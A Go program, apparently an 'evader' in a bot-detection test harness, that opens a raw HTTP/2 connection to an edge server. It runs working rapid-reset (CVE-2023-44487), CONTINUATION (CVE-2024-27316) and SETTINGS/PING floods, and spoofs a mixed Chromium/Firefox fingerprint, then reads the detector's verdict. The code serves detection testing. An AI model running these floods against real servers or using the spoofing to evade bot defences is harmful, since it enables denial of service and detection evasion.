// evaders/h2-rapid-reset/main — HTTP/2 frame-abuse floods against the edge (rapid-reset / continuation / control).
// Mints a session, runs the KS_MODE flood, then a final request so the detector can attribute the abuse.

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

func env(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

// readVerdict fetches and decodes the detector's verdict for a session id.
func readVerdict(detector, sid string) (any, error) {
	resp, err := http.Get(detector + "/verdict/" + sid) //nolint:gosec,noctx
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var v any
	if err := json.Unmarshal(body, &v); err != nil {
		return string(body), nil
	}
	return v, nil
}

func main() {
	edge := env("KITSUNE_EDGE", "https://edge:8443/")
	detector := env("KITSUNE_DETECTOR", "http://detector:8080")
	floods := 150
	mode := env("KS_MODE", "rapidreset")

	u, err := url.Parse(edge)
	if err != nil {
		panic(err)
	}
	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	conn, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"h2"}}) //nolint:gosec
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		panic(err)
	}
	fr := http2.NewFramer(conn, conn)
	fr.ReadMetaHeaders = hpack.NewDecoder(4096, nil)
	// KS_MODE=settingssplit forges a HALF-spoofed h2 stack: the SETTINGS preface carries Chromium's profile
	// ({1,4,6}, no MAX_FRAME_SIZE=5 → SettingsBrowser()=chrome) while the request pseudo-header order below is
	// Firefox's (m,p,a,s → Browser()=firefox). The two engine reads of one connection disagree →
	// net.h2_settings_vs_order. A real browser's SETTINGS and header order always name the SAME engine.
	if mode == "settingssplit" {
		err = fr.WriteSettings(
			http2.Setting{ID: http2.SettingHeaderTableSize, Val: 65536},
			http2.Setting{ID: http2.SettingInitialWindowSize, Val: 6291456},
			http2.Setting{ID: http2.SettingMaxHeaderListSize, Val: 262144},
		)
	} else {
		err = fr.WriteSettings()
	}
	if err != nil {
		panic(err)
	}

	var hb bytes.Buffer
	enc := hpack.NewEncoder(&hb)
	writeReq := func(stream uint32, cookie string) {
		hb.Reset()
		_ = enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
		if mode == "settingssplit" {
			// Firefox pseudo-header order: method, path, authority, scheme (m,p,a,s).
			_ = enc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
			_ = enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Hostname()})
			_ = enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
		} else {
			_ = enc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
			_ = enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
			_ = enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Hostname()})
		}
		if cookie != "" {
			_ = enc.WriteField(hpack.HeaderField{Name: "cookie", Value: "ks_sid=" + cookie})
		}
		_ = fr.WriteHeaders(http2.HeadersFrameParam{StreamID: stream, BlockFragment: hb.Bytes(), EndHeaders: true, EndStream: true})
	}

	// 1. A real request to mint the session; read response headers for the ks_sid cookie.
	writeReq(1, "")
	sid := ""
	_ = conn.SetReadDeadline(time.Now().Add(8 * time.Second)) // never block forever on a raw frame read
	for sid == "" {
		f, err := fr.ReadFrame()
		if err != nil {
			break
		}
		if mh, ok := f.(*http2.MetaHeadersFrame); ok {
			for _, hf := range mh.Fields {
				if strings.EqualFold(hf.Name, "set-cookie") && strings.Contains(hf.Value, "ks_sid=") {
					sid = strings.SplitN(strings.SplitN(hf.Value, "ks_sid=", 2)[1], ";", 2)[0]
				}
			}
		}
	}
	if sid == "" {
		fmt.Println("no ks_sid — could not mint session")
		return
	}

	// 2. The flood. KS_MODE=continuation runs the CVE-2024-27316 shape (one open HEADERS followed by a
	// stream of empty CONTINUATION frames); KS_MODE=controlflood runs the 2019 control-frame floods
	// (CVE-2019-9515 SETTINGS / CVE-2019-9512 PING); KS_MODE=settingssplit is no flood at all (the
	// half-spoofed h2 stack was already captured at mint time); the default is the CVE-2023-44487 rapid reset.
	sent := 0
	if mode == "settingssplit" {
		// No frame abuse — the SETTINGS/header-order engine mismatch is in the connection preface + first
		// request, already fingerprinted. Fall through to the completing request and verdict read.
	} else if mode == "controlflood" {
		// Spam empty SETTINGS and (non-ACK) PING frames — a real client sends one preface SETTINGS and rarely
		// a PING, never hundreds. The edge's ControlFrameFlood (Settings+Pings >= 100) trips → net.h2_control_flood.
		for i := 0; i < floods; i++ {
			var werr error
			if i%2 == 0 {
				werr = fr.WriteSettings()
			} else {
				werr = fr.WritePing(false, [8]byte{byte(i)})
			}
			if werr != nil {
				break // server's own control-flood mitigation may have closed the connection
			}
			sent++
		}
	} else if mode == "continuation" {
		// HEADERS on stream 3 without END_HEADERS, then empty CONTINUATION frames; the last sets
		// END_HEADERS so the (otherwise valid, empty-continued) request completes and a handler runs.
		hb.Reset()
		_ = enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
		_ = enc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
		_ = enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
		_ = enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Hostname()})
		_ = enc.WriteField(hpack.HeaderField{Name: "cookie", Value: "ks_sid=" + sid})
		_ = fr.WriteHeaders(http2.HeadersFrameParam{StreamID: 3, BlockFragment: hb.Bytes(), EndStream: true})
		for i := 0; i < floods; i++ {
			last := i == floods-1
			if err := fr.WriteContinuation(3, last, nil); err != nil {
				break // server's CONTINUATION-flood mitigation may have closed the connection
			}
			sent++
		}
	} else {
		for i := 0; i < floods; i++ {
			s := uint32(3 + 2*i)
			writeReq(s, sid)
			if err := fr.WriteRSTStream(s, http2.ErrCodeCancel); err != nil {
				break // server may have closed the connection (its own rapid-reset mitigation)
			}
			sent++
		}
	}

	// 3. A final completing request on the same session, so a handler runs and sees the flood counts.
	writeReq(1001, sid)
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	for i := 0; i < 20; i++ {
		if _, err := fr.ReadFrame(); err != nil {
			break // deadline or connection close (the server's own rapid-reset mitigation) ends the read
		}
	}

	// 4. Read the detector's verdict for the session.
	verdict := map[string]any{"flood_frames_sent": sent, "mode": mode}
	if resp, err := readVerdict(detector, sid); err == nil {
		verdict["verdict"] = resp
	} else {
		verdict["verdict_error"] = err.Error()
	}
	out, _ := json.Marshal(map[string]any{"mode": "h2-rapid-reset", "session_id": sid, "result": verdict})
	fmt.Println("__KS__" + string(out))
}
